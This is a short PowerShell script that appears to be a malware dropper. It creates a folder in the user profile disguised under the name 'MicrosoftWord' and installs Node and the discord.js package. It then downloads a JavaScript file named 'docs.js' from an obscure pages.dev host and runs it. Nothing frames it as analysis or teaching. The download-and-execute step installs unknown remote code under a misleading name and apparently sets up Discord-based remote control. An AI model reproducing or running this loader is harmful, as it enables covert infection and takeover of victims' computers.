$folderPath = Join-Path -Path $env:USERPROFILE -ChildPath "MicrosoftWord"

if (-Not (Test-Path -Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
}

Set-Location -Path $folderPath

Start-Process -FilePath "C:\Program Files\nodejs\npm.cmd" -ArgumentList "init -y" -Wait -NoNewWindow

Start-Sleep -Seconds 5

Start-Process -FilePath "C:\Program Files\nodejs\npm.cmd" -ArgumentList "install discord.js" -Wait -NoNewWindow

Start-Sleep -Seconds 5

Invoke-WebRequest -Uri "https://ipspjyikta.pages.dev/files/docs.js" -OutFile "$folderPath\docs.js"

Start-Process -FilePath "C:\Program Files\nodejs\node.exe" -ArgumentList "docs.js" -NoNewWindow
